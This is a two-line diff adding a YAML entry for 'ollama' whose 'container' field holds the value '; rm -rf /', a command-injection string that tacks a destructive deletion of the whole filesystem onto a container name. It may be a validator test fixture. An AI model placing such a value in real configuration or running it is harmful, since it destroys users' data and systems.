@@ -1,0 +1,2 @@
+ollama:
+  container: "; rm -rf /"
